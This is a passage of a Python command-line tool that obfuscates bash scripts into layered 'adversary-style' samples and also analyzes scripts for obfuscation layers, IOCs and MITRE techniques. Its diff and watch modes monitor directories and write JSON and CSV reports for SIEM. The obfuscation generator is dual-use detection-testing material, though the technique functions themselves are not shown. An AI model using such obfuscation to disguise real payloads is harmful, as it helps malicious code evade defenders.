    script = open(args.file).read() if args.file else f"#!/usr/bin/bash\n{args.inline}"
    print(f"[*] Original Payload:\n    {get_payload(script)}\n")
    results = {}

    if args.technique == 'all':
        for key, (func, desc) in {k:v for k,v in TECHNIQUES.items() if k not in ('all','multi')}.items():
            output = func(script); results[key] = output
            print_section(f"[{key.upper()}] {desc}", output, DETECTION_NOTES.get(key))
        output, log = technique_multi_layer(script, layers=args.layers)
        results['multi'] = output
        print_section(f"[MULTI] Multi-layer ({args.layers} layers)", output,
                      "Multiple stacked indicators — simulates real adversary tooling")
        print("  Layers applied:")
        for l in log: print(f"   {l}")
    elif args.technique == 'multi':
        output, log = technique_multi_layer(script, layers=args.layers)
        results['multi'] = output
        print_section(f"[MULTI] Multi-layer ({args.layers} layers)", output,
                      "Multiple stacked obfuscation indicators")
        for l in log: print(f"   {l}")
    else:
        func, desc = TECHNIQUES[args.technique]
        output = func(script); results[args.technique] = output
        print_section(f"[{args.technique.upper()}] {desc}", output, DETECTION_NOTES.get(args.technique))

    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)
        for key, content in results.items():
            path = os.path.join(args.output_dir, f"obfuscated_{key}.sh")
            open(path,'w').write(content+'\n'); print(f"\n[+] Saved: {path}")

    print(f"\n{'═'*64}\n  {len(results)} sample(s) generated.\n{'═'*64}\n")

def run_analyze(args):
    use_color = not args.no_color
    script    = open(args.file).read() if args.file else args.inline
    print(f"[*] Analyzing script ({len(script)} chars)...\n")
    result = analyze_script(script)
    print(render_analysis(result, use_color=use_color))
    if args.report:
        ts   = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        base = args.output_dir or '.'; os.makedirs(base, exist_ok=True)
        path = os.path.join(base, f"analysis_{ts}.json")
        json.dump(render_report_json(result), open(path,'w'), indent=2)
        print(f"[+] JSON report saved: {path}\n")

# ─────────────────────────────────── DIFF MODE ───────────────────────────────

def load_snapshot(source, recursive=False):
    """
    Load a snapshot as a dict keyed by basename -> record dict.

    source can be:
      - A batch_summary_*.json file previously saved with --report
      - A directory  → scan + analyze on the fly now

    Each record contains:
      file, risk_label, risk_score, layers, final_payload, iocs, mitre, error
    """
    if os.path.isfile(source):
        # ── JSON snapshot ─────────────────────────────────────────────────────
        raw  = json.load(open(source))
        data = {}
        for item in raw.get('results', []):
            key = os.path.basename(item['file'])
            data[key] = {
                'file':          item['file'],
                'risk_label':    item.get('risk_label', 'UNKNOWN'),
                'risk_score':    item.get('risk_score') or 0,
                'layers':        item.get('layers', []),
                'final_payload': item.get('final_payload') or '',
                'iocs':          item.get('iocs', {}),
                'mitre':         item.get('mitre', []),
                'error':         item.get('error'),
            }
        return data, raw.get('timestamp', 'unknown'), os.path.abspath(source)

    elif os.path.isdir(source):
        # ── Live scan ─────────────────────────────────────────────────────────
        files = collect_files(source, recursive=recursive)
        data  = {}
        print(f"  [scan] Analyzing {len(files)} file(s) in '{source}'...")
        for fpath in files:
            key = os.path.basename(fpath)
            try:
                content = open(fpath, 'r', errors='replace').read()
                r = analyze_script(content)
                data[key] = {
                    'file':          fpath,
                    'risk_label':    r.risk_label,
                    'risk_score':    r.risk_score,
                    'layers':        [l['name'] for l in r.detected_layers],
                    'final_payload': r.final_payload,
                    'iocs':          r.iocs,
                    'mitre':         [m['id'] for m in r.mitre_techniques],
                    'error':         None,
                }
            except Exception as e:
                data[key] = {'file': fpath, 'risk_label':'ERROR', 'risk_score':0,
                             'layers':[], 'final_payload':'', 'iocs':{}, 'mitre':[],
                             'error': str(e)[:80]}
        ts = datetime.utcnow().isoformat() + 'Z'
        return data, ts, os.path.abspath(source)

    else:
        print(f"[!] --diff source not found: {source}")
        sys.exit(1)


RISK_ORDER = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'ERROR': 0, 'UNKNOWN': 0}

def risk_delta_label(old_label, new_label):
    """Return a short string describing score movement direction."""
    old_n = RISK_ORDER.get(old_label, 0)
    new_n = RISK_ORDER.get(new_label, 0)
    if new_n > old_n:  return '▲ ESCALATED'
    if new_n < old_n:  return '▼ de-escalated'
    return '  unchanged'


def diff_snapshots(old_snap, new_snap):
    """
    Compare two snapshots and return a structured diff dict.
    """
    old_keys = set(old_snap.keys())
    new_keys = set(new_snap.keys())

    added   = sorted(new_keys - old_keys)
    removed = sorted(old_keys - new_keys)
    common  = sorted(old_keys & new_keys)

    changed      = []   # files whose risk label or score shifted
    unchanged    = []   # files with identical risk label
    file_details = {}   # per-file IOC/layer/MITRE diffs for changed files

    for key in common:
        old = old_snap[key]
        new = new_snap[key]

        score_delta = (new['risk_score'] or 0) - (old['risk_score'] or 0)
        label_changed = old['risk_label'] != new['risk_label']

        # IOC diffs (flatten all IOC values for comparison)
        def flat_iocs(rec):
            vals = set()
            for lst in rec['iocs'].values():
                vals.update(lst)
            return vals

        old_iocs = flat_iocs(old)
        new_iocs = flat_iocs(new)
        new_ioc_vals  = sorted(new_iocs - old_iocs)
        gone_ioc_vals = sorted(old_iocs - new_iocs)

        # Layer diffs
        old_layers = set(old.get('layers', []))
        new_layers = set(new.get('layers', []))
        new_layer_vals  = sorted(new_layers - old_layers)
        gone_layer_vals = sorted(old_layers - new_layers)

        # MITRE diffs
        old_mitre = set(old.get('mitre', []))
        new_mitre = set(new.get('mitre', []))
        new_mitre_vals  = sorted(new_mitre - old_mitre)
        gone_mitre_vals = sorted(old_mitre - new_mitre)

        # Payload changed?
        payload_changed = (old.get('final_payload','').strip() !=
                           new.get('final_payload','').strip())

        is_changed = (label_changed or score_delta != 0 or
                      new_ioc_vals or gone_ioc_vals or
                      new_layer_vals or gone_layer_vals or
                      new_mitre_vals or gone_mitre_vals)

        detail = {
            'old_label':       old['risk_label'],
            'new_label':       new['risk_label'],
            'old_score':       old['risk_score'],
            'new_score':       new['risk_score'],
            'score_delta':     score_delta,
            'label_changed':   label_changed,
            'new_iocs':        new_ioc_vals,
            'gone_iocs':       gone_ioc_vals,
            'new_layers':      new_layer_vals,
            'gone_layers':     gone_layer_vals,
            'new_mitre':       new_mitre_vals,
            'gone_mitre':      gone_mitre_vals,
            'payload_changed': payload_changed,
            'old_payload':     old.get('final_payload',''),
            'new_payload':     new.get('final_payload',''),
        }
        file_details[key] = detail

        if is_changed:
            changed.append(key)
        else:
            unchanged.append(key)

    # Aggregate new IOCs/techniques across ALL new files (added + changed)
    all_old_iocs = set()
    for rec in old_snap.values():
        for lst in rec['iocs'].values(): all_old_iocs.update(lst)
    all_new_iocs = set()
    for rec in new_snap.values():
        for lst in rec['iocs'].values(): all_new_iocs.update(lst)

    all_old_mitre = set()
    for rec in old_snap.values(): all_old_mitre.update(rec.get('mitre',[]))
    all_new_mitre = set()
    for rec in new_snap.values(): all_new_mitre.update(rec.get('mitre',[]))

    return {
        'added':           added,
        'removed':         removed,
        'changed':         changed,
        'unchanged':       unchanged,
        'file_details':    file_details,
        'net_new_iocs':    sorted(all_new_iocs - all_old_iocs),
        'net_gone_iocs':   sorted(all_old_iocs - all_new_iocs),
        'net_new_mitre':   sorted(all_new_mitre - all_old_mitre),
        'net_gone_mitre':  sorted(all_old_mitre - all_new_mitre),
    }


def render_diff(diff, old_label, new_label, old_ts, new_ts, use_color=True):
    """Render the full diff report to a string."""
    B  = BLD if use_color else ''
    X  = RST if use_color else ''
    GR = '\033[92m' if use_color else ''   # green  = new / added
    RD = '\033[91m' if use_color else ''   # red    = removed / gone
    YL = '\033[93m' if use_color else ''   # yellow = changed
    CY = '\033[96m' if use_color else ''   # cyan   = info
    w  = 72

    lines = []
    lines += [
        f"\n{'═'*w}",
        f"  {B}DIFF REPORT{X}",
        f"  Generated : {datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')} UTC",
        f"{'─'*w}",
        f"  {B}BASELINE (old):{X}  {old_label}",
        f"  {B}CURRENT  (new):{X}  {new_label}",
        f"{'═'*w}",
    ]

    total = (len(diff['added']) + len(diff['removed']) +
             len(diff['changed']) + len(diff['unchanged']))
    lines.append(
        f"\n  {B}Overview:{X}  "
        f"{GR}+{len(diff['added'])} new{X}  "
        f"{RD}-{len(diff['removed'])} removed{X}  "
        f"{YL}~{len(diff['changed'])} changed{X}  "
        f"{len(diff['unchanged'])} unchanged  "
        f"({total} total)"
    )

    # ── NEW FILES ─────────────────────────────────────────────────────────────
    lines.append(f"\n  {B}{GR}NEW FILES (+{len(diff['added'])}){X}{B}:{X}")
    if diff['added']:
        for fname in diff['added']:
            lines.append(f"    {GR}+{X} {fname}")
    else:
        lines.append("    (none)")

    # ── REMOVED FILES ─────────────────────────────────────────────────────────
    lines.append(f"\n  {B}{RD}REMOVED FILES (-{len(diff['removed'])}){X}{B}:{X}")
    if diff['removed']:
        for fname in diff['removed']:
            lines.append(f"    {RD}-{X} {fname}")
    else:
        lines.append("    (none)")

    # ── CHANGED FILES ─────────────────────────────────────────────────────────
    lines.append(f"\n  {B}{YL}CHANGED FILES (~{len(diff['changed'])}){X}{B}:{X}")
    if diff['changed']:
        # Sort escalated first
        def change_sort(k):
            d = diff['file_details'][k]
            return -(RISK_ORDER.get(d['new_label'],0) - RISK_ORDER.get(d['old_label'],0))
        for fname in sorted(diff['changed'], key=change_sort):
            d = diff['file_details'][fname]
            delta_str = risk_delta_label(d['old_label'], d['new_label'])
            score_str = f"{d['old_score']}→{d['new_score']}"
            arrow = '▲' if d['score_delta'] > 0 else ('▼' if d['score_delta'] < 0 else '~')
            col   = RD if d['score_delta'] > 0 else (GR if d['score_delta'] < 0 else YL)
            lines.append(f"\n    {col}{arrow}{X} {B}{fname}{X}")
            lines.append(f"      Risk  : {d['old_label']} → {col}{d['new_label']}{X}  "
                         f"(score {score_str}, Δ{d['score_delta']:+d})")

            if d['new_layers']:
                layers = ', '.join(d['new_layers'])
                lines.append(f"      {GR}+ Layers : {layers}{X}")
            if d['gone_layers']:
                layers = ', '.join(d['gone_layers'])
                lines.append(f"      {RD}- Layers : {layers}{X}")

            if d['new_iocs']:
                for ioc in d['new_iocs']:
                    lines.append(f"      {GR}+ IOC    : {ioc}{X}")
            if d['gone_iocs']:
                for ioc in d['gone_iocs']:
                    lines.append(f"      {RD}- IOC    : {ioc}{X}")

            if d['new_mitre']:
                for tid in d['new_mitre']:
                    lines.append(f"      {GR}+ MITRE  : {tid}{X}")
            if d['gone_mitre']:
                for tid in d['gone_mitre']:
                    lines.append(f"      {RD}- MITRE  : {tid}{X}")

            if d['payload_changed']:
                old_p = (d['old_payload'] or '(none)').replace('\n',' ')[:55]
                new_p = (d['new_payload'] or '(none)').replace('\n',' ')[:55]
                lines.append(f"      {RD}- Payload: {old_p}{X}")
                lines.append(f"      {GR}+ Payload: {new_p}{X}")
    else:
        lines.append("    (none)")

    # ── NET NEW IOCs ──────────────────────────────────────────────────────────
    lines.append(f"\n  {B}Net New IOCs (first seen in current scan):{X}")
    if diff['net_new_iocs']:
        for ioc in diff['net_new_iocs']:
            lines.append(f"    {GR}+{X} {ioc}")
    else:
        lines.append("    (none)")

    lines.append(f"\n  {B}Net Dropped IOCs (no longer seen):{X}")
    if diff['net_gone_iocs']:
        for ioc in diff['net_gone_iocs']:
            lines.append(f"    {RD}-{X} {ioc}")
    else:
        lines.append("    (none)")

    # ── NET NEW MITRE ─────────────────────────────────────────────────────────
    lines.append(f"\n  {B}Net New MITRE Techniques:{X}")
    if diff['net_new_mitre']:
        for tid in diff['net_new_mitre']:
            lines.append(f"    {GR}+{X} {tid}")
    else:
        lines.append("    (none)")

    lines.append(f"\n  {B}Net Dropped MITRE Techniques:{X}")
    if diff['net_gone_mitre']:
        for tid in diff['net_gone_mitre']:
            lines.append(f"    {RD}-{X} {tid}")
    else:
        lines.append("    (none)")

    # ── UNCHANGED ─────────────────────────────────────────────────────────────
    if diff['unchanged']:
        lines.append(f"\n  {B}Unchanged ({len(diff['unchanged'])}):{X}  "
                     + ', '.join(diff['unchanged'][:8])
                     + ('…' if len(diff['unchanged']) > 8 else ''))

    lines.append(f"\n{'═'*w}\n")
    return '\n'.join(lines)


def render_diff_json(diff, old_src, new_src, old_ts, new_ts):
    """Serialize diff to a JSON-safe dict."""
    return {
        'generated':    datetime.utcnow().isoformat() + 'Z',
        'baseline':     {'source': old_src, 'timestamp': old_ts},
        'current':      {'source': new_src, 'timestamp': new_ts},
        'summary': {
            'added':     len(diff['added']),
            'removed':   len(diff['removed']),
            'changed':   len(diff['changed']),
            'unchanged': len(diff['unchanged']),
        },
        'added_files':    diff['added'],
        'removed_files':  diff['removed'],
        'changed_files':  diff['changed'],
        'unchanged_files': diff['unchanged'],
        'file_details':   diff['file_details'],
        'net_new_iocs':   diff['net_new_iocs'],
        'net_gone_iocs':  diff['net_gone_iocs'],
        'net_new_mitre':  diff['net_new_mitre'],
        'net_gone_mitre': diff['net_gone_mitre'],
    }


def render_diff_csv(diff):
    """Flat CSV of changed/added/removed files for SIEM ingest."""
    import csv, io
    buf = io.StringIO()
    w   = csv.writer(buf)
    w.writerow(['status','file','old_risk','new_risk','score_delta',
                'new_layers','gone_layers','new_iocs','gone_iocs',
                'new_mitre','gone_mitre','payload_changed'])
    for fname in diff['added']:
        w.writerow(['ADDED', fname,'','','','','','','','','',''])
    for fname in diff['removed']:
        w.writerow(['REMOVED', fname,'','','','','','','','','',''])
    for fname in diff['changed']:
        d = diff['file_details'][fname]
        w.writerow([
            'CHANGED', fname,
            d['old_label'], d['new_label'], d['score_delta'],
            '|'.join(d['new_layers']),  '|'.join(d['gone_layers']),
            '|'.join(d['new_iocs']),    '|'.join(d['gone_iocs']),
            '|'.join(d['new_mitre']),   '|'.join(d['gone_mitre']),
            str(d['payload_changed']),
        ])
    for fname in diff['unchanged']:
        w.writerow(['UNCHANGED', fname,'','',0,'','','','','','','False'])
    return buf.getvalue()


def run_diff(args):
    """
    Diff mode entry point.
    --diff OLD NEW  where OLD and NEW are each either:
      - a batch_summary*.json file   (fast, no re-analysis)
      - a directory path             (live scan + analyze)
    """
    use_color = not args.no_color
    old_src, new_src = args.diff

    print(f"[*] Loading baseline : {old_src}")
    old_snap, old_ts, old_abs = load_snapshot(old_src, recursive=args.recursive)
    print(f"    {len(old_snap)} file(s) loaded  (ts: {old_ts})")

    print(f"\n[*] Loading current  : {new_src}")
    new_snap, new_ts, new_abs = load_snapshot(new_src, recursive=args.recursive)
    print(f"    {len(new_snap)} file(s) loaded  (ts: {new_ts})\n")

    diff = diff_snapshots(old_snap, new_snap)
    print(render_diff(diff, old_abs, new_abs, old_ts, new_ts, use_color=use_color))

    if args.report:
        ts   = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        base = args.output_dir or '.'; os.makedirs(base, exist_ok=True)

        jpath = os.path.join(base, f"diff_{ts}.json")
        json.dump(render_diff_json(diff, old_abs, new_abs, old_ts, new_ts),
                  open(jpath,'w'), indent=2)
        print(f"[+] Diff JSON saved : {jpath}")

        cpath = os.path.join(base, f"diff_{ts}.csv")
        open(cpath,'w').write(render_diff_csv(diff))
        print(f"[+] Diff CSV saved  : {cpath}\n")


# ─────────────────────────────────── WATCH MODE ──────────────────────────────
#
#  Continuously monitors a directory, re-scanning every N seconds.
#  On the first tick it establishes a baseline. Every subsequent tick it diffs
#  the live state against the previous snapshot and prints only what changed.
#
#  Alert levels:
#    ALERT   — new or escalated CRITICAL/HIGH file detected
#    WARN    — risk score increased or new IOCs appeared
#    INFO    — files removed, de-escalated, or unchanged delta
#    OK      — no filesystem changes detected (heartbeat)
#
#  Press Ctrl-C for a clean exit with full session summary.

import time, signal, hashlib

def clear_line():
    sys.stdout.write('\r\033[K'); sys.stdout.flush()

def hide_cursor():
    sys.stdout.write('\033[?25l'); sys.stdout.flush()

def show_cursor():
    sys.stdout.write('\033[?25h'); sys.stdout.flush()

SPINNER = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']


def fingerprint_dir(directory, recursive=False):
    """sha256 fingerprint of every candidate file → detect changes without full re-analysis."""
    fp = {}
    for fpath in collect_files(directory, recursive=recursive):
        try:
            fp[os.path.basename(fpath)] = hashlib.sha256(open(fpath,'rb').read()).hexdigest()
        except Exception:
            fp[os.path.basename(fpath)] = 'ERROR'
    return fp


def changed_files(old_fp, new_fp):
    ok, nk = set(old_fp), set(new_fp)
    return nk - ok, ok - nk, {k for k in ok & nk if old_fp[k] != new_fp[k]}


def fmt_alert(level, msg, use_color=True):
    if not use_color: return f"[{level}] {msg}"
    C = {'ALERT':'\033[91m','WARN':'\033[93m','INFO':'\033[96m','OK':'\033[92m'}.get(level,'')
    return f"{C}[{level}]{RST} {msg}"


def classify_diff_severity(diff, new_snap):
    for fname in diff['added']:
        if new_snap.get(fname,{}).get('risk_label') in ('CRITICAL','HIGH'):
            return 'ALERT', f"NEW {new_snap[fname]['risk_label']} file: {fname}"
    for fname in diff['changed']:
        d = diff['file_details'][fname]
        if (RISK_ORDER.get(d['new_label'],0) > RISK_ORDER.get(d['old_label'],0)
                and d['new_label'] in ('CRITICAL','HIGH')):
            return 'ALERT', f"ESCALATED to {d['new_label']}: {fname}"
    if diff['net_new_iocs']:
        return 'WARN', f"{len(diff['net_new_iocs'])} new IOC(s): {', '.join(diff['net_new_iocs'][:3])}"
    for fname in diff['changed']:
        if diff['file_details'][fname]['score_delta'] > 0:
            return 'WARN', f"Score ↑ in {fname}"
    if diff['removed']:  return 'INFO', f"{len(diff['removed'])} file(s) removed"
    if diff['changed']:  return 'INFO', f"{len(diff['changed'])} file(s) changed (no escalation)"
    return 'OK', "No changes detected"


class WatchSession:
    def __init__(self, watch_dir, interval, use_color):
        self.watch_dir     = watch_dir
        self.interval      = interval
        self.use_color     = use_color
        self.started_at    = datetime.utcnow()
        self.tick          = 0
        self.alerts        = 0
        self.warns         = 0
        self.total_changes = 0
        self.seen_iocs     = set()
        self.event_log     = []   # (ts, level, msg)

    def record(self, level, msg):
        self.event_log.append((datetime.utcnow().strftime('%H:%M:%S'), level, msg))
        if level == 'ALERT': self.alerts += 1
        elif level == 'WARN': self.warns  += 1

    def summary(self):
        B = BLD if self.use_color else ''; X = RST if self.use_color else ''
        elapsed = datetime.utcnow() - self.started_at
        h, rem  = divmod(int(elapsed.total_seconds()), 3600); m, s = divmod(rem, 60)
        w = 72
        lines = [f"\n{'═'*w}", f"  {B}WATCH SESSION SUMMARY{X}",
                 f"  Directory  : {self.watch_dir}",
                 f"  Duration   : {h:02d}:{m:02d}:{s:02d}",
                 f"  Ticks      : {self.tick}  (interval: {self.interval}s)",
                 f"  Alerts     : {self.alerts}",
                 f"  Warnings   : {self.warns}",
                 f"  Changes    : {self.total_changes}",
                 f"  Unique IOCs: {len(self.seen_iocs)}"]
        if self.seen_iocs:
            lines.append(f"  IOCs seen  :")
            for ioc in sorted(self.seen_iocs): lines.append(f"    • {ioc}")
        if self.event_log:
            lines.append(f"\n  {B}Event Log:{X}")
            for ts, lvl, msg in self.event_log:
                lines.append(f"    [{ts}] {fmt_alert(lvl, msg, self.use_color)}")
        lines.append(f"\n{'═'*w}\n")
        return '\n'.join(lines)


def run_watch(args):
    use_color  = not args.no_color
    watch_dir  = args.watch
    interval   = args.interval
    recursive  = args.recursive
    save_rep   = args.report
    out_dir    = args.output_dir
    alert_only = args.alert_only
    GR = '\033[92m' if use_color else ''
    B  = BLD if use_color else ''; X = RST if use_color else ''

    if not os.path.isdir(watch_dir):
        print(f"[!] --watch path is not a directory: {watch_dir}"); sys.exit(1)

    session = WatchSession(watch_dir, interval, use_color)

    def _exit(sig, frame):
        show_cursor()
        print(f"\n\n[*] Watch stopped. Session summary:")
        print(session.summary())
        sys.exit(0)
    signal.signal(signal.SIGINT, _exit)

    hide_cursor()
    print(f"\n  {B}WATCH MODE{X}  →  {watch_dir}")
    print(f"  Interval   : {interval}s  |  Recursive : {recursive}")
    print(f"  Alert-only : {alert_only}  |  Reports   : {save_rep}")
    print(f"  Started    : {session.started_at.strftime('%Y-%m-%dT%H:%M:%SZ')} UTC")
    print(f"  Ctrl-C to stop and print session summary.\n")

    # ── Baseline (tick 0) ─────────────────────────────────────────────────────
    print(f"  {GR}[INIT]{X} Building baseline...", end='', flush=True)
    prev_fp   = fingerprint_dir(watch_dir, recursive=recursive)
    prev_snap, prev_ts, _ = load_snapshot(watch_dir, recursive=recursive)
    for rec in prev_snap.values():
        for lst in rec['iocs'].values(): session.seen_iocs.update(lst)
    clear_line()
    high_risk = sum(1 for r in prev_snap.values() if r['risk_label'] in ('CRITICAL','HIGH'))
    print(f"  {GR}[INIT]{X} Baseline: {len(prev_snap)} file(s), "
          f"{high_risk} high-risk, {len(session.seen_iocs)} IOC(s)")

    if save_rep and out_dir:
        os.makedirs(out_dir, exist_ok=True)
        bpath = os.path.join(out_dir, f"watch_baseline_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json")
        json.dump({'timestamp': prev_ts, 'scan_directory': os.path.abspath(watch_dir),
                   'results': [{'file':r['file'],'risk_label':r['risk_label'],
                                'risk_score':r['risk_score'],'layers':r['layers'],
                                'final_payload':r['final_payload'],'iocs':r['iocs'],
                                'mitre':r['mitre'],'error':r['error']}
                               for r in prev_snap.values()]},
                  open(bpath,'w'), indent=2)
        print(f"  {GR}[INIT]{X} Baseline saved: {bpath}")

    # ── Poll loop ─────────────────────────────────────────────────────────────
    spinner_i = 0
    while True:
        for remaining in range(interval, 0, -1):
            spin = SPINNER[spinner_i % len(SPINNER)]; spinner_i += 1
            elapsed_s = int((datetime.utcnow() - session.started_at).total_seconds())
            h, rem = divmod(elapsed_s, 3600); m, s = divmod(rem, 60)
            clear_line()
            sys.stdout.write(
                f"  {spin} Tick {session.tick+1:>4} | next in {remaining:>3}s | "
                f"uptime {h:02d}:{m:02d}:{s:02d} | "
                f"ALERT={session.alerts} WARN={session.warns} Δ={session.total_changes}"
            )
            sys.stdout.flush()
            time.sleep(1)

        clear_line()
        session.tick += 1
        ts_str = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        ts_now = datetime.utcnow().strftime('%H:%M:%S')

        # Fast fingerprint — only full-analyze if disk content changed
        curr_fp = fingerprint_dir(watch_dir, recursive=recursive)
        added_f, removed_f, modified_f = changed_files(prev_fp, curr_fp)

        if not (added_f or removed_f or modified_f):
            if not alert_only:
                print(f"  [{ts_now}] {fmt_alert('OK', 'No filesystem changes', use_color)}")
            continue

        # Full analysis pass
        sys.stdout.write(f"  [{ts_now}] Changes on disk — analyzing {len(curr_fp)} file(s)...")
        sys.stdout.flush()
        curr_snap, curr_ts, _ = load_snapshot(watch_dir, recursive=recursive)
        clear_line()

        diff   = diff_snapshots(prev_snap, curr_snap)
        level, reason = classify_diff_severity(diff, curr_snap)

        # Update session stats
        session.seen_iocs.update(diff['net_new_iocs'])
        session.total_changes += len(diff['added']) + len(diff['removed']) + len(diff['changed'])
        session.record(level, reason)

        # Always print the headline
        n_add = len(diff['added']); n_rem = len(diff['removed']); n_chg = len(diff['changed'])
        print(f"  [{ts_now}] {fmt_alert(level, reason, use_color)}  "
              f"[+{n_add} -{n_rem} ~{n_chg}]")

        # Detailed diff output (suppressed in alert_only mode for INFO/OK)
        if not alert_only or level in ('ALERT','WARN'):
            print(render_diff(diff, 'prev_snapshot',
                              f"{watch_dir} (tick {session.tick})",
                              prev_ts, curr_ts, use_color=use_color))

        # Save per-tick reports
        if save_rep and out_dir:
            os.makedirs(out_dir, exist_ok=True)
            jpath = os.path.join(out_dir, f"watch_diff_{ts_str}.json")
            cpath = os.path.join(out_dir, f"watch_diff_{ts_str}.csv")
            json.dump(render_diff_json(diff, 'prev_snapshot',
                                       os.path.abspath(watch_dir), prev_ts, curr_ts),
                      open(jpath,'w'), indent=2)
            open(cpath,'w').write(render_diff_csv(diff))
            print(f"  {GR}[saved]{X} {jpath}")
            print(f"  {GR}[saved]{X} {cpath}")

        prev_snap, prev_fp, prev_ts = curr_snap, curr_fp, curr_ts


# ──────────────────────────────────── CLI ────────────────────────────────────

def main():
    args = parse_args()
    print_banner()
    if args.list_techniques:
        print("Available Obfuscation Techniques:\n")
        for key, (_, desc) in TECHNIQUES.items(): print(f"  {key:<8} {desc}")
        print(); return

    # Diff mode
    if args.diff:
        run_diff(args)
        return

    # Watch mode — continuous monitoring
    if args.watch:
        run_watch(args)
        return

    # Batch mode — single directory scan
    if args.batch:
        run_batch(args)
        return

    # Single-file modes require -f or --inline
    if not args.file and not args.inline:
        print("[!] Provide one of: --watch <dir>  |  --diff OLD NEW  |  --batch <dir>  |  -f <file>  |  --inline '<cmd>'")
        sys.exit(1)

    if args.analyze:
        run_analyze(args)
    else:
        run_obfuscate(args)

if __name__ == '__main__':
    main()
